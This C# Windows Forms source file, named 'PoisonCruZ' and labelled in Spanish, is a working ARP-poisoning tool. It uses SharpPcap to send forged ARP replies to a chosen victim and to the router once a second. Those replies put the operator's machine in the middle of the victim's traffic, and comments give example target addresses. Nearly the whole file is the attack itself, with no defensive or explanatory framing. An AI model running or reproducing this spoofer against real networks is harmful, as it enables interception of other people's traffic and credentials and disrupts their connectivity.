using System;
using System.Windows.Forms;
using SharpPcap;
using PacketDotNet;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;

namespace PoisonCruZ
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        public static void sendARPresponsePacket(ICaptureDevice device, IPAddress srcIP, IPAddress dstIP, PhysicalAddress srcMac, PhysicalAddress dstMac)
        {
            ARPPacket arp = new ARPPacket(ARPOperation.Response, dstMac, dstIP, srcMac, srcIP);
            EthernetPacket eth = new EthernetPacket(srcMac, dstMac, EthernetPacketType.Arp);
            arp.PayloadData = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
            eth.PayloadPacket = arp;
            device.SendPacket(eth);
        }
        bool breake = false;
        private void button1_Click(object sender, EventArgs e)
        {
            if (button1.Text== "Envenenar ARP")
            {
                button1.Text = "";
                CaptureDeviceList devices = CaptureDeviceList.Instance;
                ICaptureDevice device = devices[comboBox1.SelectedIndex];
                device.Open(DeviceMode.Normal, 1000);
                breake = true;
                Thread arpenv = new Thread(() => {
                    while (breake)
                    {
                        sendARPresponsePacket(device, IPAddress.Parse(tir.Text), IPAddress.Parse(tiv.Text), PhysicalAddress.Parse(ttmac.Text.ToUpper()), PhysicalAddress.Parse(tmv.Text.ToUpper()));//PoisonCruZ -i eth0 -t 192.168.1.16 192.168.1.1
                        sendARPresponsePacket(device, IPAddress.Parse(tiv.Text), IPAddress.Parse(tir.Text), PhysicalAddress.Parse(ttmac.Text.ToUpper()), PhysicalAddress.Parse(tmr.Text.ToUpper()));//PoisonCruZ -i eth0 -t 192.168.1.1 192.168.1.16
                        sendARPresponsePacket(device, IPAddress.Parse(tir.Text), IPAddress.Parse(tti.Text), PhysicalAddress.Parse(tmr.Text.ToUpper()), PhysicalAddress.Parse(ttmac.Text.ToUpper()));//FIX MAC INTERNA DEL ROUTER
                        sendARPresponsePacket(device, IPAddress.Parse(tiv.Text), IPAddress.Parse(tti.Text), PhysicalAddress.Parse(tmv.Text.ToUpper()), PhysicalAddress.Parse(ttmac.Text.ToUpper()));//FIX MAC INTERNA DE LA VICTIMA
                        Thread.Sleep(1000);
                    }
                    Thread.CurrentThread.Abort();
                });
                arpenv.IsBackground = true;
                arpenv.Start();
                button1.Text = "Parar";
            }
            else if (button1.Text == "Parar")
            {
                breake = false;
                button1.Text = "Envenenar ARP";
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            CaptureDeviceList devices = CaptureDeviceList.Instance;
            foreach (ICaptureDevice objeto in devices)
            {
                comboBox1.Items.Add(objeto.Description);
            }
        }
    }
}
